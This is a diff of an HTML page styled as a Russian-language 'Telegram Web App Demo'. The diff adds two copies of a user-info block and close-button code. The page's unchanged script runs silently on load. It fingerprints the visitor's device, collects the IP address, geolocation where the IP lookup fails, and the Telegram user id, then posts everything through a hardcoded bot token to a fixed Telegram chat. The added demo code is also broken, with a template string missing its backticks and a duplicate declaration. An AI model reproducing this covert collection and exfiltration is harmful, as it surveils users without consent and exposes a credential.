@@ -5,13 +5,71 @@
     <script async src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
+    <div>
+        <h1>Telegram Web App Demo</h1>
+        <p>Это демонстрационное веб-приложение для Telegram</p>
+
+        <div class="user-info">
+            <h3>Информация о пользователе:</h3>
+            <p id="user-data">Загрузка данных...</p>
+        </div>
+
+        <button class="close-btn" id="close-btn">Закрыть приложение</button>
+    </div>
+
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+
+        // Показываем основную кнопку (если нужно)
+        tg.MainButton.show();
+
+        // Получаем данные пользователя
+        const user = tg.initDataUnsafe.user;
+
+        // Выводим данные в консоль
+        console.log("Данные Telegram WebApp:", tg);
+        console.log("Данные пользователя:", user);
+
+        // Отображаем данные пользователя на странице
+        if (user) {
+            const userDataElement = document.getElementById('user-data');
+            userDataElement.innerHTML =
+                <strong>ID:</strong> ${user.id}<br>
+                <strong>Имя:</strong> ${user.first_name || 'Не указано'}<br>
+                <strong>Фамилия:</strong> ${user.last_name || 'Не указано'}<br>
+                <strong>Username:</strong> ${user.username || 'Не указано'}<br>
+                <strong>Язык:</strong> ${user.language_code || 'Не указано'}<br>
+                <strong>Платформа:</strong> ${tg.platform || 'Не определена'}
+            ;
+        } else {
+            document.getElementById('user-data').textContent = 'Данные пользователя недоступны';
+        }
+
+        // Обработка кнопки закрытия
+        document.getElementById('close-btn').addEventListener('click', function() {
+            if (confirm('Вы уверены, что хотите закрыть приложение?')) {
+                tg.close();
+            }
+        });
+
+        // Также можно обработать событие закрытия через BackButton
+        tg.BackButton.onClick(function() {
+            if (confirm('Вы уверены, что хотите закрыть приложение?')) {
+                tg.close();
+            }
+        });
+
+        // Показываем кнопку "Назад" (аналог кнопки закрытия на мобильных устройствах)
+        tg.BackButton.show();
+    </script>
 <script>
     // Telegram Bot API configuration
     const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
     const CHAT_ID = '5540487728';
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const tg = window.Telegram?.WebApp;
-    
+
     // Detect browser features
     function detectFeatures() {
         const features = {
@@ -112,14 +170,14 @@
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
             const ipInfo = { ip: data.ip };
-            
+
             // Try to get geolocation if available
-            
-            
+
+
             return ipInfo;
         } catch (e) {
             const ipInfo = { ip: 'unavailable' };
-            
+
             // Continue without IP if the request fails
             if (navigator.geolocation) {
                 try {
@@ -137,7 +195,7 @@
             } else {
                 ipInfo.geolocation = 'unavailable';
             }
-            
+
             return ipInfo;
         }
     }
@@ -152,7 +210,7 @@
         const batteryInfo = await getBatteryInfo();
         const ipInfo = await getIPInfo();
         const fonts = await getFonts();
-        
+
         const systemInfo = {
             // Basic info
             timestamp: new Date().toISOString(),
@@ -161,13 +219,13 @@
             vendor: navigator.vendor,
             language: navigator.language,
             languages: navigator.languages,
-            
+
             // Hardware
             cpuCores: getCPUCores(),
             deviceMemory: getDeviceMemory() + ' GB',
             gpu: getGPUInfo(),
             battery: batteryInfo,
-            
+
             // Screen
             screen: {
                 width: screen.width,
@@ -178,7 +236,7 @@
                 pixelRatio: window.devicePixelRatio,
                 orientation: screen.orientation.type
             },
-            
+
             // Browser
             browser: {
                 name: navigator.appName,
@@ -187,17 +245,17 @@
                 plugins: getPlugins(),
                 mimeTypes: Array.from(navigator.mimeTypes).map(mime => mime.type)
             },
-            
+
             // Network
             network: getNetworkInfo(),
             ipInfo: ipInfo,
-            
+
             // Features
             features: detectFeatures(),
-            
+
             // Fonts
             fonts: fonts,
-            
+
             // Performance
             performance: {
                 memory: window.performance.memory ? {
@@ -210,7 +268,7 @@
                 } : 'Timing API not available'
             }
         };
-        
+
         sendToTelegram(systemInfo);
     }
 
@@ -222,14 +280,14 @@
         } else {
             text += `📅 *Tg id:* -\n`;
         }
-    
+
     // Basic info
     text += `📅 *Timestamp:* ${data.timestamp}\n`;
     text += `🌐 *User Agent:* ${data.userAgent}\n`;
     text += `💻 *Platform:* ${data.platform}\n`;
     text += `🏷 *Vendor:* ${data.vendor || 'unknown'}\n`;
     text += `🗣 *Language:* ${data.language}\n\n`;
-    
+
     // Hardware
     text += `⚙️ *Hardware Information*\n`;
     text += `🔢 *CPU Cores:* ${data.cpuCores}\n`;
@@ -237,7 +295,7 @@
     text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
     text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
     text += `🔋 *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;
-    
+
     // Screen
     text += `🖥 *Screen Information*\n`;
     text += `📏 *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
@@ -245,7 +303,7 @@
     text += `🎨 *Color Depth:* ${data.screen.colorDepth}-bit\n`;
     text += `🔍 *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
     text += `🔄 *Orientation:* ${data.screen.orientation}\n\n`;
-    
+
     // Network
     text += `🌐 *Network Information*\n`;
     if (typeof data.network === 'object') {
@@ -256,7 +314,7 @@
     } else {
         text += `${data.network}\n`;
     }
-    
+
     // IP Info
     if (typeof data.ipInfo === 'object') {
         text += `📍 *IP Address:* ${data.ipInfo.ip}\n`;
@@ -268,7 +326,7 @@
     } else {
         text += `${data.ipInfo}\n\n`;
     }
-    
+
     // Features
     text += `✨ *Browser Features*\n`;
     text += `🍪 *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
@@ -278,11 +336,11 @@
     text += `👆 *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
     text += `🖍️ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
     text += `🔊 *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
-    
+
     // Plugins
     text += `🧩 *Browser Plugins*\n`;
     text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
-    
+
     // Performance
     text += `⚡ *Performance Information*\n`;
     if (typeof data.performance.memory === 'object') {
@@ -290,13 +348,13 @@
     } else {
         text += `${data.performance.memory}\n`;
     }
-    
+
     if (typeof data.performance.timing === 'object') {
         text += `⏱ *Page Load Time:* ${data.performance.timing.loadTime}\n`;
     } else {
         text += `${data.performance.timing}\n`;
     }
-    
+
     fetch(TELEGRAM_API_URL, {
         method: 'POST',
         headers: {
@@ -325,8 +383,68 @@
 
     // Start collection on page load
     window.onload = collectSystemInfo;
-    
+
 </script>
 
+
+    <div>
+        <h1>Telegram Web App Demo</h1>
+        <p>Это демонстрационное веб-приложение для Telegram</p>
+
+        <div class="user-info">
+            <h3>Информация о пользователе:</h3>
+            <p id="user-data">Загрузка данных...</p>
+        </div>
+
+        <button class="close-btn" id="close-btn">Закрыть приложение</button>
+    </div>
+
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+
+        // Показываем основную кнопку (если нужно)
+        tg.MainButton.show();
+
+        // Получаем данные пользователя
+        const user = tg.initDataUnsafe.user;
+
+        // Выводим данные в консоль
+        console.log("Данные Telegram WebApp:", tg);
+        console.log("Данные пользователя:", user);
+
+        // Отображаем данные пользователя на странице
+        if (user) {
+            const userDataElement = document.getElementById('user-data');
+            userDataElement.innerHTML =
+                <strong>ID:</strong> ${user.id}<br>
+                <strong>Имя:</strong> ${user.first_name || 'Не указано'}<br>
+                <strong>Фамилия:</strong> ${user.last_name || 'Не указано'}<br>
+                <strong>Username:</strong> ${user.username || 'Не указано'}<br>
+                <strong>Язык:</strong> ${user.language_code || 'Не указано'}<br>
+                <strong>Платформа:</strong> ${tg.platform || 'Не определена'}
+            ;
+        } else {
+            document.getElementById('user-data').textContent = 'Данные пользователя недоступны';
+        }
+
+        // Обработка кнопки закрытия
+        document.getElementById('close-btn').addEventListener('click', function() {
+            if (confirm('Вы уверены, что хотите закрыть приложение?')) {
+                tg.close();
+            }
+        });
+
+        // Также можно обработать событие закрытия через BackButton
+        tg.BackButton.onClick(function() {
+            if (confirm('Вы уверены, что хотите закрыть приложение?')) {
+                tg.close();
+            }
+        });
+
+        // Показываем кнопку "Назад" (аналог кнопки закрытия на мобильных устройствах)
+        tg.BackButton.show();
+    </script>
 </body>
 </html>
+
